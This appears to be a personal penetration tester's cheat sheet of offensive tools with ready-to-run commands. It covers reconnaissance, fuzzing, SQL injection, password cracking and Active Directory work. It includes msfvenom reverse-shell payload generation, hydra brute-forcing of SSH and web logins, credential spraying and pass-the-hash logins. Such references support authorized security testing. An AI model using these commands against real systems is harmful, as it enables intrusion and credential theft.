# tools

## recon

**nmap** - port scanning, service detection, scripts
**masscan** - fast AF port scanning, use for big ranges then nmap for details
**subfinder** - passive subdomain enumeration
**amass** - more aggressive subdomain enum, takes a while
**httpx** - probe URLs, check what's alive, grab titles/tech

```bash
subfinder -d target.com | httpx -title -tech-detect -status-code
```

**shodan** - search for exposed services, `shodan search hostname:target.com`
**crt.sh** - certificate transparency, great for subdomains
**waybackurls** - pull URLs from Wayback Machine, find old endpoints
**gau** - similar to waybackurls but more sources

---

## web

**burp suite** - the main one, use it for everything, community edition is fine for most stuff
- learn the intruder, repeater, decoder
- useful extensions: turbo intruder, autorize, param miner, jwt editor

**ffuf** - directory/file fuzzing, also good for vhost fuzzing
```bash
ffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ
ffuf -w wordlist.txt -u https://target.com/FUZZ -e .php,.html,.txt,.bak
# vhost
ffuf -w subdomains.txt -u https://target.com -H "Host: FUZZ.target.com"
```

**gobuster** - similar to ffuf, slightly simpler syntax
**feroxbuster** - recursive, written in rust, pretty fast

**nikto** - web server scanner, noisy but finds obvious stuff
**nuclei** - template based scanner, tons of templates for known CVEs and misconfigs

**sqlmap** - SQLi automation, don't use blindly
```bash
sqlmap -u "https://target.com/page?id=1" --dbs
sqlmap -r request.txt --level 5 --risk 3
```

**dalfox** - XSS scanner, actually pretty good
**xsstrike** - another XSS scanner

---

## exploitation

**metasploit** - for known exploits mostly, msfvenom for payloads
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
```

**searchsploit** - search exploit-db offline
```bash
searchsploit apache 2.4
searchsploit -m 12345  # copy exploit to current dir
```

---

## password stuff

**hashcat** - GPU cracking
```bash
hashcat -a 0 -m 0 hashes.txt rockyou.txt      # MD5
hashcat -a 0 -m 1000 hashes.txt rockyou.txt   # NTLM
hashcat -a 0 -m 1800 hashes.txt rockyou.txt   # sha512crypt
hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a       # brute force 6 chars
```

**john** - slower but easier syntax for some things
```bash
john --wordlist=rockyou.txt hashes.txt
john --format=bcrypt --wordlist=rockyou.txt hashes.txt
```

**hydra** - online brute force
```bash
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -l root -P rockyou.txt ssh://target.com
```

rockyou.txt lives at `/usr/share/wordlists/rockyou.txt` on kali
seclists is also essential: `/usr/share/wordlists/seclists/`

---

## post exploitation / AD

**bloodhound** - visualize AD, find paths to DA, actually really useful
**impacket** - python tools for AD/windows stuff
- `secretsdump.py` - dump hashes
- `psexec.py` - shell as admin if you have creds
- `getTGT.py` - kerberos tickets

**evil-winrm** - remote management, nicer than other options
```bash
evil-winrm -i TARGET -u user -p password
evil-winrm -i TARGET -u user -H NTLM_HASH
```

**crackmapexec** - spray creds across network, check access
```bash
cme smb 192.168.1.0/24 -u user -p password
cme smb TARGET -u user -p password --shares
```

---

## misc utilities

**interactsh** - OOB interactions (like burp collaborator but free)
```bash
interactsh-client
```

**jwt_tool** - test JWT tokens
```bash
python3 jwt_tool.py TOKEN -T  # tamper
python3 jwt_tool.py TOKEN -C -d wordlist.txt  # crack
```

**gf** - grep patterns for common vulns (from tomnomnom)
```bash
cat urls.txt | gf sqli
cat urls.txt | gf xss
```

---

## wordlists i use most

- `rockyou.txt` - passwords
- `seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` - dirs
- `seclists/Discovery/DNS/subdomains-top1million-5000.txt` - subdomains
- `seclists/Fuzzing/SQLi/Generic-SQLi.txt` - SQLi payloads
- `seclists/Fuzzing/XSS/XSS-Jhaddix.txt` - XSS payloads

---

## setup stuff

things i install fresh on every kali:
```bash
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
go install github.com/ffuf/ffuf/v2@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/tomnomnom/gf@latest
pip3 install impacket
```

`$GOPATH/bin` needs to be in PATH or nothing works, add to `.bashrc`
